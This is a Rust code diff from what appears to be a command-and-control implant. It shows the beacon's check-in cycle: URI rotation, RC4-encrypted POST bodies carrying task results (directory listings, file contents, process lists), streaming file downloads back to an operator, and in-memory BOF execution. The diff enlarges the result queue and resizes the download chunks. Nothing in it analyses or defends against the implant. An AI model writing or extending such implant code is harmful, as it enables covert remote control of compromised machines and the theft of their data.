@@ -66,9 +66,11 @@ pub struct Instance {
     /// Check-in counter (sequential URI rotation).
     pub cycle: u32,
     /// Task results queued for the next POST body — RAW records, the
-    /// results-size header is written at POST time (small records only;
-    /// download chunks are streamed straight into the cycle body).
-    pub results: [u8; 512],
+    /// results-size header is written at POST time (the 16 KiB covers
+    /// the multi-entry records: a full 128-entry ls, a capped cat, ps
+    /// batches and a handful of small acks; download chunks bypass this
+    /// queue and stream straight into the cycle body).
+    pub results: [u8; 16 * 1024],
     pub results_len: usize,
     /// Active download (one at a time; the operator queues them anyway).
     pub download: Option<crate::tasks::DownloadState>,
@@ -514,7 +516,8 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
 
     // Body: RC4(session) of the framed results — the records queued by
     // the previous cycle plus the streaming download progress (one
-    // 64 KiB chunk per POST, docs/WIRE.md). Everything read below is
+    // 48 KiB chunk per POST, docs/WIRE.md; the 16 KiB queue + 48 KiB
+    // chunk fit the 0x12000 body frame). Everything read below is
     // written first (uninit buffers, the memset rule).
     let mut results: [u8; 0x12000] = core::mem::MaybeUninit::uninit().assume_init();
     let mut w = Writer::new(&mut results);
@@ -524,7 +527,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         crate::runtime::debug::log(instance, b"ci: fail results\n");
         return;
     }
-    let mut chunk: [u8; 64 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
+    let mut chunk: [u8; 48 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
     crate::tasks::download_tick(instance, &mut w, &mut chunk);
     crate::coff::bof_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
@@ -606,7 +609,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     // Records for the next cycle land here as RAW bytes (the size
     // header is written at POST time — download chunks bypass this
     // queue and stream straight into the cycle body).
-    let mut queued: [u8; 512] = core::mem::MaybeUninit::uninit().assume_init();
+    let mut queued: [u8; 16 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
     let mut w = Writer::new(&mut queued);
     while r.remaining() >= 8 {
         // `execute bof`: the COFF image and the params blob borrow the
@@ -649,8 +652,9 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
         }
     }
     // Manual copy (memcpy rule): only the written prefix moves to the
-    // instance. An overflowing queue drops the tail — the 512-byte cap
-    // covers every small record this code produces.
+    // instance. An overflowing queue drops the tail — multi-entry
+    // writers copy their records atomically (tasks.rs), so what lands
+    // here is always well-formed.
     let n = w.written();
     let mut i = 0;
     while i < n && i < instance.results.len() {
